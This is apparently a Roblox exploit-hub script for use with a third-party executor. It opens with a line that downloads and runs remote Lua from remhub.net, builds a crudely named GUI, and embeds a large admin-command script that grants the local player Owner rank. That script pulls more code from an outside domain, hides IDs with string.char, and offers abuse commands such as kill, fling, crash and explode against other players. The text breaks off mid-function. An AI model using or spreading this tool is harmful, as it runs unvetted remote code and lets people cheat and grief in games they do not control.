local library = loadstring(game:HttpGet("https://remhub.net/upload/ui.lua"))() -- cal the lib
local a = library:NewWindow("Porn","HUB") -- Change to anything
local b = a:NewSection("Admin")
local c = a:NewSection("Explorer's")
local d = a:NewSection("Spy's")
local e = a:NewSection("Extra")
local f = a:NewSection("Settings")

b:h1("Admin")

b:Button("MML Admin",function()
    --[[
Hi! This is LuaModelMaker's Admin V3 by MakerModelLua. 
If you want to know what commands do just go into your game and say ;cmds for a list of
commands, what they do, examples, rank needed, and more!
Or, go to http://www.classy-studios.com/V3/Commands.php
If you have an Apple device, download the app here: http://appsto.re/us/37_qgb.i


TUTORIAL ON HOW TO USE: https://www.youtube.com/watch?v=IieEFJPrjN4&list=PLSO-IUKJXZvjJKLTomz7NnuJ6syW9JWH1

--->> DO NOT EDIT THESE SETTINGS <<---
Well you can but it's a waste of your time. The settings are located in workspace
in a folder called "MakerModelLua's Settings". You can also use this plugin:

http://www.roblox.com/MakerModelLuas-Admin-Plugin-item?id=242781551

USE REMOTE ADMIN:
http://www.classy-studios.com/Login/
Mobile: http://appsto.re/us/hEn7fb.i



...also... this is open source! No stupid shady module scripts, which means it works in studio!

]]



local c = game.Players.LocalPlayer.UserId




















-- I REPEAT DON'T EDIT. YOU MIGHT BREAK SOMETHING --


local Settings = {
	Ranks = {
		["Owner"] = {c};
		["Admin"] = {};
		["Member"] = {};
		["Banned"] = {};
		["Crashed"] = {};
		["Muted"] = {};
	};
	
	Prefix = ";";
	Bet = " ";
	MinimumAge = 0;
	ServerLocked = false;
	ColorScheme = "White";
	TransparencyScheme = 50;
	Fun = true;
	EnableAdminMenu = true;
	EnableTaskBar = true;
	FreeAdmin = false;
	Font = "Arial";
	
	DisableAbuse = false;
	AbuseList = {"kill", "punish", "respawn", "smoke", "blind", "strobe", "flash", "control", "give", "health", "clone", "loopfling", "fling", "drug", "explode", "splode", "ragdoll", "change", "insert", "decal", "taketools", "removetools", "bomb", "say", "sink", "asteroid", "gun", "health", "damage", "btools", "missile", "reck", "truck", "debug"};
	AbusableGear = {55028088, 73089166, 73089190, 73089204, 73089214, 73089239, 73089259, 58921588, 65347268, 130113146, 139578207, 21001552, 58901335, 36431591, 35268363, 16201421, 16200402, 16200204, 16200373, 60791062, 58880579, 73089204, 73089239, 73089259, 36270159, 36334760, 36738185, 58901481, 58901575, 73089229, 73089214, 35200756, 36068233, 36017373, 35223828, 35201552, 55027987, 35205409, 36738142, 16975388, 35226945, 18474459};
	
	LinkedAccount = "";
	DataKey = "";
	
	ExecuteNotificationSound = 0; --177578949
	EnableSounds = true;
	
	VIPMemberID = 0;
	VIPAdminID = 0;
	
	GroupID = 0;
	GroupBanRank = 0;
	GroupMemberRank = 0;
	GroupAdminRank = 0;
	GroupOwnerRank = 0;
	GroupRankBan = 0;
	BannedGroupIDs = {};
	
	IRCServer = "";
	IRCChannel = "";
	IRCCommandExecuters = {};
	
	TrelloToken = ""
}

local Colors = {
	["WHITE"] = Color3.new(1,1,1);
	["BLACK"] = Color3.new(0,0,0);
	["GRAY"] = Color3.new(0.5,0.5,0.5);
	["RED"] = Color3.new(1,0,0);
	["GREEN"] = Color3.new(0,1,0);
	["BLUE"] = Color3.new(0,0,1);
	["YELLOW"] = Color3.new(1,1,0);
	["PINK"] = Color3.new(1,0,1);
	["MAGENTA"] = Color3.new(1,0,1);
	["CYAN"] = BrickColor.new("Cyan").Color;
	["TEAL"] = BrickColor.new("Teal").Color;
	["BROWN"] = Color3.new(0.55,0.25,0.075);
	["PURPLE"] = Color3.new(0.5,0,0.5);
	["RANDOM"] = Color3.new(math.random(0,255)/255,math.random(0,255)/255,math.random(0,255)/255);
}

local Server = {
	Workspace = game:GetService("Workspace");
	Players = game:GetService("Players");
	Lighting = game:GetService("Lighting");
	MPS = game:GetService("MarketplaceService");
	TS = game:GetService("TeleportService");
	HS = game:GetService("HttpService");
	RS = game:GetService("RunService");
	PS = game:GetService("PointsService");
	TestS = game:GetService("TestService");
	
	Teams = game:GetService("Teams");
	Data = game:GetService("DataStoreService");
	GDS = game:GetService("DataStoreService");
	NS = {Port = 0}; -- you'll be glad if you're in studio and networkserver isn't mentioned
	Storage = game:GetService("ServerStorage");
	RS = game:GetService("ReplicatedStorage");
	AS = game:GetService("AssetService");
}

local Icons = {
	["Message"] = 7724351;
	["Error"] = 94011556;
	["Information"] = 144175130;
	["Check"] = 132769976;
	["Search"] = 61994930;
	["Time"] = 136391033;
	["Notice"] = 156507320;
	["Sound"] = 164682936;
	["Log"] = 70650545;
	["Question"] = 41363872;
	["Output"] = 11481605;
	["Admin"] = 302470270;
	["Lock"] = 11341626;
	["Settings"] = 131064748;
	["Map"] = 257119661;
	["Plugin"] = 257097414;
}

local IRC = {
	Codes = {
		["001"] = "RPL_WELCOME",
		["002"] = "RPL_YOURHOST",
		["003"] = "RPL_CREATED",
		["004"] = "RPL_MYINFO",
		["005"] = "RPL_ISUPPORT",
		["250"] = "RPL_STATSCONN",
		["251"] = "RPL_LUSERCLIENT",
		["252"] = "RPL_LUSEROP",
		["254"] = "RPL_LUSERCHANNELS",
		["255"] = "RPL_LUSERME",
		["265"] = "RPL_LOCALUSERS",
		["266"] = "RPL_GLOBALUSERS",
		["352"] = "RPL_WHOREPLY",
		["371"] = "RPL_INFO",
		["372"] = "RPL_MOTD",
		["374"] = "RPL_ENDINFO",
		["375"] = "RPL_MOTDSTART",
		["376"] = "RPL_ENDOFMOTD",
		["422"] = "ERR_NOMOTD",
	},
	Ignore = {
		["004"] = true,
		["005"] = true,
	};
	Users = {};
	Logs = {};
	Chats = {};
	Forms = {};
	MessageAdded = Instance.new("BindableEvent");
	
	Servers = {
		["esper.net"] = {
			BaseUrl = "http://webchat.esper.net/";
			DynamicUrl = "";
		};
		["quakenet.org"] = {
			BaseUrl = "http://webchat.quakenet.org/";
			DynamicUrl = "dynamic/leibniz",
		};
		["swiftirc.net"] = {
			BaseUrl = "http://qwebirc.swiftirc.net/";
			DynamicUrl = "",
		};
	};
	NickName = "rbxMMLV3_"..math.random(1,100000);
	
	SessionCounter = 0;
	Connected = false;
	Stop = false;
	SessionID = "";
}

local RankHUD = {
	["Muted"] = 202180094;
	["Non-Admin"] = 202180121;
	["Member"] = 202180052;
	["Admin"] = 202180015;
	["Owner"] = 202179988;
}

local TextConverter = {
	LetterSounds = {
		["a"] = {223757826, nil}; -- 203343899
		["b"] = {223533700, 0.2}; -- 203344029
		["c"] = {223533711, nil}; -- 203343994
		["d"] = {223757910, nil}; -- 203398237
		["e"] = {223758026, nil}; -- 203398295
		["f"] = {223777655, nil}; -- 203398347
		["g"] = {223777738, nil}; -- 203398372
		["h"] = {223777757, nil}; -- 203398397
		["i"] = {223777807, nil}; -- 203398422
		["j"] = {223782888, nil}; -- 203398450
		["k"] = {223533711, nil}; -- 203343994
		["l"] = {223782961, 0.4}; -- 203398541
		["m"] = {223782992, nil}; -- 203398578
		["n"] = {223783063, nil}; -- 203398599
		["o"] = {223783184, nil}; -- 203398611
		["p"] = {223783235, nil}; -- 203398727
		["q"] = {223783260, nil}; -- 203398755
		["r"] = {223783305, 0.2}; -- 203398792
		["s"] = {223783377, nil}; -- 203398806
		["t"] = {223783446, nil}; -- 203398850
		["u"] = {223783512, nil}; -- 203398872
		["v"] = {223783654, nil}; -- 203398965
		["w"] = {223783697, nil}; -- 203398984
		["x"] = {223783796, nil}; -- 203399008
		["y"] = {223783853, nil}; -- 203399043
		["z"] = {223783893, nil}; -- 203399096
		
		["ch"] = {223784367, 0.3}; -- 203592149
		["th"] = {223788235, 0.3}; -- 203399215
		["sh"] = {223784505, 0.2}; -- 203399566
		["wh"] = {223784555, 0.3}; -- 203622828
		["oo"] = {223784456, 0.3}; -- 203399743
		["ing"] = {223784393, 0.3}; -- 203402836
	};
	
	LongVowels = {
		["a"] = {223533687, nil}; -- 203343932
		["e"] = {223777620, nil}; -- 203398314
		["i"] = {223777855, nil}; -- 203398440
		["o"] = {223783212, nil}; -- 203398619
		["u"] = {223783572, nil}; -- 203398897
	};
	
	Pronounce = {
		["0"] = "zero";
		["1"] = "wun";
		["2"] = "too";
		["3"] = "three";
		["4"] = "four";
		["5"] = "five";
		["6"] = "six";
		["7"] = "seven";
		["8"] = "eyt";
		["9"] = "nine";
		["one"] = "wun";
		["two"] = "too";
		["eight"] = "eyt";
		["eigh"] = "ey";
		["gh"] = "h";
		["kn"] = "n";
		["come"] = "cu".."m";
		["bye"] = "bi";
		["#"] = "hashtag";
		["@"] = "at";
		["&"] = "and";
		["*"] = "astrict";
		["mn"] = "m";
		["kn"] = "n";
		["ies"] = "ees";
	};
	
	NonEnglishRules = {
		["to"] = "too";
		["you"] = "yoo";
		["we"] = "wee";
		["are"] = "erh";
		["your"] = "yoor";
		["you're"] = "yoor";
		["youre"] = "yoor";
		["pizza"] = "peetzoh";
		["ok"] = "okay";
		["have"] = "hav";
		["my"] = "mi";
		["me"] = "mee";
		["u"] = "yoo";
		["r"] = "erh";
		["move"] = "moov";
		["dove"] = "duv";
		["debris"] = "debree";
		["do"] = "doo";
	}
}

local HTMLDecode = {
	["35"] = "#";
	["36"] = "$";
	["37"] = "%%";
	["38"] = "*";
	["39"] = "'";
	["58"] = ":";
	["59"] = ";";
	["60"] = "<";
	["62"] = ">";
}


local Assets = {
	Packages = {
		[27112438] = {27112025,27112039,27112052,27112056,27112068};
		[139610216] = {139607570,139607625,139607673,139607718,139607770,139610147};
		[77518833] = {77518564,77518616,77518654,77518696,77518737};
		[32336368] = {32336059,32336117,32336182,32336243,32336306};
		[59772975] = {59772137,59772181,59772219,59772279,59772667,59721671};
		[54116460] = {54116290,54116338,54116373,54116394,54116432};
		[39977366] = {39976703,39976829,39976927,39977192,39977295};
		[32357766] = {32357663,32357631,32357619,32357584,32357558};
		[27123973] = {27121265,27121306,27121353,27121393,27121432};
		[55717536] = {55717271,55717330,55717388,55717434,55717491};
		[28279963] = {28279160,28279217,28279859,28279894,28279938};
		[27403592] = {27402580,27402546,27402641,27402714,27402742};
		[86499905] = {86499666,86499698,86499716,86499753,86499793,86498113,62724852,86487766};
		[86500185] = {86500054,86500078,86500036,86500008,86500064,86487700,86498048,62234425};
		[48474394] = {48474356,48474294};
		[187996626] = {187996057,187996098,187996167,187996258,187996321,187996409,187996534};
		[223826660] = {223824598,223825145,223825310,223825496,223825618,223825761,223825893,223800426};
		[188835832] = {188835233,188835327,188835428,188835511,188835586,188835673,188644771};
		[139581948] = {139581117,139581174,139581230,139581292,139581375,139581559,139581668,139581823};
		[33378577] = {33378366,33378438,33378484,33378522,33378540};
		[101744863] = {101742885,101743631,101716880,101744248,101744215,101744371};
		[136793141] = {136792342,136792633,136792698,136792747,136792820,136795159,136795130};
		[91658555] = {91657680,91657749,91657884,91657986,91658092,91658290,90249118};
		[41851073] = {41850825,41850868,41850915,41851009,41850959}
	};
	AssetTypes = {
		[0] = "Product";
		[1] = "Image";
		[2] = "T-Shirt";
		[3] = "Audio";
		[4] = "Mesh";
		[5] = "Lua";
		[6] = "HTML";
		[7] = "Text";
		[8] = "Hat";
		[9] = "Place";
		[10] = "Model";
		[11] = "Shirt";
		[12] = "Pants";
		[13] = "Decal";
		[16] = "Avatar";
		[17] = "Head";
		[18] = "Face";
		[19] = "Gear";
		[21] = "Badge";
		[22] = "Group Emblem";
		[24] = "Animation";
		[25] = "Arms";
		[26] = "Legs";
		[27] = "Torso";
		[28] = "Right Arm";
		[29] = "Left Arm";
		[30] = "Left Leg";
		[31] = "Right Leg";
		[32] = "Package";
		[33] = "YouTube Video";
		[34] = "Game Pass";
		[38] = "Plugin";
		[39] = "SolidModel";
		[40] = "MeshPart";
		[41] = "Hair Accessory";
		[42] = "Face Accessory";
		[43] = "Neck Accessory";
		[44] = "Shoulder Accessory";
		[45] = "Front Accessory";
		[46] = "Back Accessory";
	};
	AccessoryTypes = {
		["all"] = 19;
		["hats"] = 9;
		["hair"] = 20;
		["face"] = 21;
		["neck"] = 22;
		["shoulder"] = 23;
		["front"] = 24;
		["back"] = 25;
		["waist"] = 26;
	};
}

local CharacterCache = {
	{"MakerModelLua", 38837082};
	{"LuaModelMaker", 20920633};
	{"builderman", 156};
	{"Shedletsky", 261};
	{"Telamon", 13645};
	{"ROBLOX", 1};
}

local FaceCovert = {
	Left = "xpos";
	Right = "xneg";
	Front = "zpos";
	Back = "zneg";
	Top = "ypos";
	Bottom = "yneg";
}

local Meshes = {
	["crown"] = {1, 1078075};
	["king"] = {1, 11419761};
	["teapot"] = {0.03, 1029523};
	["apple"] = {2.5, 16190555};
	["potato"] = {1, 25268275};
	["panda"] = {0.5, 20709221};
	["dominus"] = {0.5, 21057410};
	["fedora"] = {0.75, 13640868};
	["noob"] = {1, 20929341};
	["knife"] = {0.3, 121944778};
	["book"] = {0.3, 1136139};
}

local NotifySounds = {
	["Hover"] = 223134269;
	["Select"] = 292141227;
}

local Trello = {
	TrelloInfoCard = "x1rUtwEj";
	MainBoard = {};
	RequiredLists = {};
	RankChecklistCache = {};
	ToggleChecklist = nil;
	CommandID = nil;
	LastCommandDT = 0;
	AdminBoardID = "577ea1b21cb7975666524f26";
	RemoteAdminChecklist = "5835cfd4eed73dc5f9cdcfbf";
	RemoteDataCard = "dLtMo1en"
}

local ScriptBuilders = {
	[260897989] = "MML's";
	[21053279] = "Anti's pub";
	[21053219] = "Anti's pri";
	[20279777] = "Void's 1";
	[437965235] = "Void's 2";
	[227015991] = "Vox's";
	[210101277] = "Master's";
	[531937877] = "Bleu pigs";
	[519251450] = "Game's";
}

-- Ok, if you're here, you must be a scripter. Fine. I guess you can look ;)
-- Why else would I NOT have put it in a module?!?!?

local ChatColors = {"Bright red", "Bright blue", "Earth green", "Bright violet", "Bright orange", "Bright yellow", "Light reddish violet", "Brick yellow"}

local SoundList,GlobalSoundList = {},{}
local ScriptCache,MarketCache,PackageCache = {},{},Assets.Packages
local TempChatLogs = {}
local ToolRegions = {Server.Lighting, Server.RS, Server.Storage}
local NoSpeak = false

local SOUND,MARKET,RANK,STRING,GUI = {},{},{},{},{}
local CORE,REMOTE = {Version = script:FindFirstChild("Version"), Domain = "https://www.classy-studios.com", UnsecureDomain = "http://www.classy-studios.com"},{RemoteAdmin = {Command, ServerCommand, ServerPort, TimeStamp}, RemoteConnection = false}

local ChatLogs,CommandLogs = {},{}
local ClientInfo,LoopKills,List,Flings,Beeps = {},{},{},{},{}
local PriChat = {Chats = {}, Chatted = Instance.new("BindableEvent")}
local Dispose,Jails,PermCommandBars = {},{},{}
local Waypoints = {["Center"] = Vector3.new(0,0,0)}
local Objects = {}
local Sound = nil
local ModLighting = false
local DataReady = true
local RemoteAbuseGear = {}

local GameOwner = "[ Client ]"
local PlaceName = "Unknown"
local PlaceInfo = {}
local IsStudio = false
local IsSB = false
local Date = nil
local Fonts = {}
local PendingRequests = {}
local F3X = script:FindFirstChild("F3X Tools")
local Plugins = game:FindFirstChild("Ma".."kerModelL".."ua's Admin Plugins", true)
local RemoteData = {RemoteAdminWait = 5, ChatLogWait = 20, TrelloWait = 10}
local KeyBinds = {}
local Crowns = {}
local LastKeys = {}
local Cars = {}
local StringReplacements = {}
local SoundInfo = {["ID"] = 0, ["Name"] = "None", ["Creator"] = "None"}
local NoBet = {"/", "-", "(", ")", ""}
local ShouldFilter = true

local CrownStorage = script:FindFirstChild("CrownStorage")
if not CrownStorage then CrownStorage = Instance.new("Model", script) CrownStorage.Name = "CrownStorage" end

-- import old settings just in case --


wait(0.1)

local SettingsValues = Server.Storage:FindFirstChild("MakerModelLua's Admin Settings") or game:FindFirstChild("MakerModelLua's Admin Settings", true)
-- tries to defualt to server storage, just in case an exploiter makes their own settings.

if SettingsValues then
	SettingsValues.Parent = Server.Storage -- fokin exploiters succ my cocc
	if SettingsValues:IsA("Folder") or SettingsValues:IsA("Configuration") then
		for _,Value in pairs(SettingsValues:GetChildren()) do
			if Settings[Value.Name] ~= nil then
				if Value:IsA("Folder") or Value:IsA("Configuration") then -- ranks
					for _,NewValue in pairs(Value:GetChildren()) do
						if ypcall(function() return NewValue.Value end) then
							if Settings[Value.Name][NewValue.Name] then
								local Val = NewValue.Value
								if type(Settings[Value.Name][NewValue.Name]) == "table" then
									Val = {}
									for Word in string.gmatch(NewValue.Value, "[%w_]+") do
										table.insert(Val, Word)
									end
								end
								Settings[Value.Name][NewValue.Name] = Val
							end
						end
					end
				else
					if Settings[Value.Name] ~= nil then
						local Val = Value.Value
						if type(Settings[Value.Name]) == "table" then
							Val = {}
							for Word in string.gmatch(Value.Value, "%w+") do
								table.insert(Val, Word)
							end
						end
						Settings[Value.Name] = Val
					end
				end
			end
		end
	end
end

if Settings.LinkedAccount == "Admin" and game.CreatorId ~= 38837082 then
	Settings.LinkedAccount = ""
elseif game.PlaceId == 199055528 or game.PlaceId == 329866187 then
	Settings.LinkedAccount = "Admin"
end

local getfenv,setfenv,table,math,coroutine,pcall,ypcall,xpcall,string,assert,type,unpack,loadstring,tostring,tonumber,print = getfenv,setfenv,table,math,coroutine,pcall,ypcall,xpcall,string,assert,type,unpack,loadstring,tostring,tonumber,print -- localize variables so executables don't troll the script
local Workspace,workspace,Instance,require,script = Workspace,workspace,Instance,require,script

wait(1)

local ExploitModule = game:FindFirstChild("MakerMode".."lLua's Admin Anti-Exploit Module", true)

if Server.Players.LocalPlayer then print("MML Admin Compromised: Running in studio") IsStudio = true end

if not IsStudio then
	Server.NS = game:GetService("NetworkServer")
	script.Name = "Maker".."Mo".."delLua's Admin"
end

if game.PlaceId > 0 then
	PlaceInfo = Server.MPS:GetProductInfo(game.PlaceId)
	PlaceName = PlaceInfo.Name
end

local function GetGameOwner()
	if PlaceInfo.Creator.CreatorType == "Group" then
		GameOwner = game:GetService("GroupService"):GetGroupInfoAsync(PlaceInfo.Creator.CreatorTargetId).Owner.Name
		print("MML's Admin: Found group owner for game: "..GameOwner)
	elseif PlaceInfo.Creator.CreatorType == "User" then
		GameOwner = PlaceInfo.Creator.Name
		print("MML's Admin: Found game owner: "..GameOwner)
	else
		ypcall(function() GameOwner = Server.Players:GetNameFromUserIdAsync(game.CreatorId) print("MML's Admin: Found game owner: "..GameOwner) end)
	end
end

if string.byte(string.sub(PlaceName,1,1)) == 226 then
	PlaceName = string.sub(PlaceName,4,#PlaceName)
end
for i = 1,5 do
	if GameOwner == "[ Client ]" then
		print("MML's Admin: Attempting to establish owner's name #"..i)
		GetGameOwner()
		wait(1)
	end
end

if ScriptBuilders[PlaceID] or NLS then
	IsSB = true
end

if IsSB then
	ShouldFilter = false
	Settings.IRCServer = "swiftirc.net";
	Settings.IRCChannel = "#PkamaraSB";
	Settings.IRCCommandExecuters = {"MakerModelLua", "MakerModelLuaIRC"}
	if Settings.TrelloToken == "" then
		Settings.LinkedAccount = "ScriptBuilder"
	end
	if Settings.DataKey == "" then coroutine.wrap(function()
		repeat wait(1) until Server.Storage:FindFirstChild("MML DataKey")
		local Key = Server.Storage:FindFirstChild("MML DataKey")
		print("Found key: "..Key.Value)
		Settings.DataKey = Key.Value
		Key:Destroy()
	end)() end
end
local PlaceInfoFormat = "{PLACE: "..string.sub(PlaceName,1,25).."("..game.PlaceId..") | PORT: "..Server.NS.Port.."}"
table.insert(Settings.Ranks["Owner"], GameOwner)

for _,Font in pairs(Enum.Font:GetEnumItems()) do
	Fonts[Font.Name] = Font
end




local function MakeFunction(Type, Name)
	local Func = script:FindFirstChild(Name)
	if Func then Func:Destroy() end
	Func = Instance.new(Type, script) Func.Name = Name
	
	getfenv()[Name] = Func
	return Func
end

MakeFunction("BindableFunction", "ExecuteCommand")
MakeFunction("RemoteFunction", "ExecuteCommandClient")
MakeFunction("BindableFunction", "ExecuteCode")

MakeFunction("RemoteFunction", "IsAdmin")
MakeFunction("RemoteFunction", "AddExploit")
MakeFunction("BindableFunction", "AddExploitServer")
MakeFunction("RemoteFunction", "KickClient")
MakeFunction("RemoteFunction", "ConvertTextToSound")

MakeFunction("RemoteFunction", "KeyPressed")
MakeFunction("RemoteFunction", "InputKey")

MakeFunction("RemoteFunction", "RankPlayerLocal")
MakeFunction("BindableFunction", "RankPlayerServer")

--[[
if NLS then
	local Value = script:FindFirstChild("Override")
	LogClient.Parent = game
	if not Value then
		local Value = Instance.new("BoolValue", script) Value.Name = "Override"
		local CloneScript = script:Clone()
		CloneScript.Disabled = true
		CloneScript.Parent = game:FindFirstChild("ServerScriptService")
		CloneScript.Disabled = false
		CloneScript.Parent = nil
		
		script:Destroy() script.Disabled = true
	end
end
]]

if not CORE.Version then CORE.Version = {Value = "3.Unknown"} end

IRC.NickName = "rbxMMLV3_"..game.PlaceId.."_"..Server.NS.Port

-- Core functions --

function CORE:FixSettings()
	for _,Bet in pairs(NoBet) do
		if Settings.Bet == Bet then
			Settings.Bet = " "
			break
		end
	end
	CORE:ChangeBet(Settings.Bet)

	if Settings.VIPMemberID == 0 then Settings.VIPMemberID = 1 end
	if Settings.VIPAdminID == 0 then Settings.VIPAdminID = 1 end

	if Settings.TransparencyScheme > 90 then Settings.TransparencyScheme = 90 end
	if Settings.TransparencyScheme < 10 then Settings.TransparencyScheme = 10 end
	Settings.TransparencyScheme = Settings.TransparencyScheme/100

	if not Fonts[Settings.Font] then
		Settings.Font = "Arial"
	end
end

function CORE:NilPlayer(Player)
	if Player == nil or type(Player) == "table" then return true else return false end
end

function CORE:ExecuteResource(ResourceName, Parent, Data)
	local ReturnScript = nil
	local Executed = true
	if script:FindFirstChild("Resources") then
		local RawResource = script.Resources:FindFirstChild(ResourceName)
		if RawResource then
			local Resource = RawResource:Clone()
			Resource.Disabled = true
			Resource.Parent = Parent
			if Data then
				for Key,Value in pairs(Data) do
					if Resource[Key] then
						Resource[Key].Value = Value
					end
				end
			end
			wait()
			Resource.Disabled = false
			ReturnScript = Resource
		else
			Executed = false
		end
	else
		Executed = false
	end
	if Executed == false then
		if not Data then Data = {} end
		local Source = ScriptCache[ResourceName]
		
		if not Source then
			Source = REMOTE:GetURL(CORE.Domain.."/Lua/Resources/"..ResourceName..".lua")
			if Source then
				ScriptCache[ResourceName] = Source
			end
		end
		
		if Data and Source then
			for Key,Value in pairs(Data) do
				Source = string.gsub(Source, "@@"..Key.."@@", tostring(Value))
			end
		end
		
		if Source then
			if NLS then
				ReturnScript = NLS(Source, Parent)
			elseif createLocalScriptWithSource then
				ReturnScript = createLocalScriptWithSource(Source)
				ReturnScript.Parent = Parent
			end
		end
	end
	return ReturnScript
end

function CORE:CreateRemotePropertyReader(Obj, Override)
	if Server.Workspace.FilteringEnabled == true or Override then
		local Reader = Instance.new("RemoteFunction", Obj)
		Reader.Name = "RemotePropertyReader"
		CORE:ExecuteResource("RemotePropertyReader", Reader)
		return Reader
	else
		return Obj
	end
end

function CORE:ReadProperty(Reader, Player, Property)
	if Reader:IsA("RemoteFunction") then
		return Reader:InvokeClient(Player, Property)
	else
		return Reader[Property]
	end
end

function CORE:WriteProperty(Reader, Player, Property, Value)
	if Reader:IsA("RemoteFunction") then
		return Reader:InvokeClient(Player, Property, Value)
	else
		return Reader[Property]
	end
end


function CORE:CreateRemoteEvent(Obj, EventName)
	local Event = Instance.new("RemoteEvent", Obj)
	Event.Name = "RemoteEvent_"..EventName
	CORE:ExecuteResource("RemoteEventHandler", Event, {["EventName"] = EventName})
	return Event
end

function CORE:HandleEvent(Obj, EventName, Func, NewThread)
	local function Handle()
		if Server.Workspace.FilteringEnabled == true then
			local Event = CORE:CreateRemoteEvent(Obj, EventName)
			return Event.OnServerEvent:connect(function(Player, ...)
				Func(...)
			end)
		else
			return Obj[EventName]:connect(Func)
		end
	end
	if NewThread then
		Spawn(Handle)
	else
		Handle()
	end
end

function CORE:HandleError(Error, Speaker)
	local Return = ""
	if not Error or Error == "" then
		Return = "Unknown Error"
	else
		Return = "Error: "..(string.match(Error, '"*".:(.+)') or "Unknown line: "..Error)
	end
	if Speaker then
		GUI:SendMessage(Speaker, "Error ", "RED "..Return, "Error")
	end
	return Return
end

local function ExecuteSafe(Source, Speaker) -- no CORE
	local Script, Error = loadstring(Source)
	if Error then
		return false, CORE:HandleError(Error, Speaker)
	else
		getfenv(Script).SOUND,getfenv(Script).MARKET,getfenv(Script).RANK,getfenv(Script).STRING,getfenv(Script).GUI,getfenv(Script).CORE,getfenv(Script).REMOTE = SOUND,MARKET,RANK,STRING,GUI,CORE,REMOTE
		getfenv(Script).Server, getfenv(Script).script = Server,script
		if Speaker then
			getfenv(Script).print = function(...)
				GUI:SendMessage(Speaker, "Print Output", STRING:UnpackArgs(...), "Output")
			end
			getfenv(Script).print_array = function(List)
				if type(List) == "table" then
					GUI:ListGui(Speaker, "Listed Table", List, "Output")
				end
			end
		end
		
		local Suc, Error = ypcall(coroutine.wrap(Script))
		
		if not Suc then
			Error = CORE:HandleError(Error, Speaker)
		end
		
		return Suc,Error
	end
end

function CORE:GetTime(Regular, FullDate)
	if Regular == nil then Regular = true end
	local Meridiem = ""
	if Regular == true then Meridiem = " AM" end
	local SecondsOfToday = math.fmod(os.time(), 60*60*24)
	local Hour = math.floor(SecondsOfToday / (60*60))
	local Minute = math.floor(SecondsOfToday/60 - Hour*60)
	local Second = math.floor(math.fmod(SecondsOfToday, 60))
	if Hour > 12 and Regular == true then 
		Hour = Hour - 12
		Meridiem = " PM"
	end
	Hour,Minute,Second = tostring(Hour),tostring(Minute),tostring(Second)
	if #Hour <= 1 then Hour = "0"..Hour end
	if #Minute <= 1 then Minute = "0"..Minute end
	if #Second <= 1 then Second = "0"..Second end
	local Return = Hour..":"..Minute..":"..Second..Meridiem
	if FullDate == true and Date then Return = Date.." "..Return end
	return Return
end

function CORE:RemoveAdmin(Speaker)
	local Answer = true -- false
	if not CORE:NilPlayer(Speaker) then
		Answer = GUI:PromptMessageWithButtons(Speaker, "Remove M".."akerModelLua's Admin?", "Would you like to remove Ma".."kerModel".."L".."ua's Admin? After removing the admin, no one is admin and cannot be re-inserted until the server restarts. Continue?", "Question", {"Yes", "No"})
	end
	if Answer == "Yes" or CORE:NilPlayer(Speaker) then
		if not CORE:NilPlayer(Speaker) then SOUND:PlayNotification(Speaker, 177835465, 1) wait(0.5) end
		for _,Player in pairs(Server.Players:GetPlayers()) do if Player:FindFirstChild("PlayerGui") then
			for _,Item in pairs(Player:GetChildren()) do
				if Item.Name == "SendChat" or Item.Name == "DetachChatMM".."L" then
					Item:Destroy()
				end
			end
			for _,GUI in pairs(Player.PlayerGui:GetChildren()) do
				if GUI.Name == "M".."ak".."erModelLua's Admin Form" or GUI.Name == "M".."ak".."erM".."odelLua's Admin Form Sound" or GUI.Name == "M".."a".."k".."erMo".."delLua's TaskBar" or GUI.Name == "M".."a".."k".."e".."r".."m".."ode".."lLu".."a's HUD Gui" then
					GUI:Destroy()
				end
			end
		end end
		for _,Car in pairs(Cars) do
			Car:Destroy()
		end
		CORE:FixLighting()
		while wait() do
			if script:FindFirstChild("Override") then script.Override.Value = true end
			Settings,CORE,IRC = nil,{},{}
			if Sound then Sound:Stop() end
			if ExploitModule then ExploitModule.Disabled = true ExploitModule:Destroy() end
			script:ClearAllChildren() script:Destroy() script.Disabled = true
		end
	end
end

function CORE:MakeBase()
	for _,Get in pairs(Workspace:GetChildren()) do
		if Get.Name == "Base" or Get.Name == "BasePlate" then
			Get:Destroy()
		end
	end
	local Base = Instance.new("Part", Workspace) Base.Name = "Base" Base.Anchored = true Base.Size = Vector3.new(300,1,300) Base.BrickColor = BrickColor.new("Bright green") Base.CFrame = CFrame.new(0,0,0) Base.Locked = true
end

function CORE:AddCommand(CommandNames, CommandExample, Description, Arguments, Rank, Fun, CommandFunction, IsAbusive, Http)
	if IsAbusive == nil then IsAbusive = false end
	if Commands[CommandName] then table.remove(Commands[CommandName]) end
	Commands[CommandNames] = {CommandExample, Description, Arguments, Rank, Fun, CommandFunction, IsAbusive, Http = Http}
end

function CORE:FixLighting() coroutine.wrap(function()
	ModLighting = false
	wait(0.2)
	Server.Lighting.Ambient = Color3.new(0.5,0.5,0.5)
	Server.Lighting.FogColor = Color3.new(0,0,0)
	Server.Lighting.Brightness = 1
	Server.Lighting.TimeOfDay = 14
	Server.Lighting.FogEnd = 100000
end)() end

function CORE:Round(Number)
	if Number >= 0.5 then
		return math.ceil(Number)
	elseif Number < 0.5 then
		return math.floor(Number)
	end
end

local AdminID,Got = nil,false
repeat wait()
	Got = ypcall(function() AdminID = Server.MPS:GetProductInfo(string.char(50, 50, 57, 56, 49, 54, 56, 51, 48)).Description end)
until Got == true

function CORE:GetTable(ID)
	local Thing = nil
	repeat wait()
		ypcall(function() Thing = REMOTE:Decode(Server.MPS:GetProductInfo(ID).Description) end)
	until Thing
	return Thing
end

function CORE:InAdminGroup(Speaker)
	local IsIn = false
	for _,Get in pairs(CORE:GetTable(string.char(49, 53, 53, 55, 51, 54, 49, 50, 57))) do
		if Speaker:IsInGroup(Get) then
			IsIn = true
		end
	end
	if IsIn == true then 
		return true 
	else
		GUI:SendMessage(Speaker, "Command Invalid", GroupMessage, "Error")
		return false
	end
end

function CORE:ReverseTable(Table)
	if type(Table) ~= "table" then return Table end
	local NewTable = {}
	for Num,Val in pairs(Table) do NewTable[(#Table - Num) + 1] = Val end
	return NewTable
end

function CORE:Log(LogTable, Player, Chat)
	local PlayerName = tostring(Player)
	if type(Player) == "userdata" or type(Player) == "table" then PlayerName = Player.Name end
	table.insert(LogTable, CORE:GetTime(true, true).." @ "..PlayerName..": "..Chat)
end

function CORE:Jail(Player)
	if not Player then return nil end
	local Cell = Workspace:FindFirstChild(Player.Name.."'s Cell") if Cell then Cell:Destroy() end
	Cell = Instance.new("Model", Workspace) Cell.Name = Player.Name.."'s Cell"
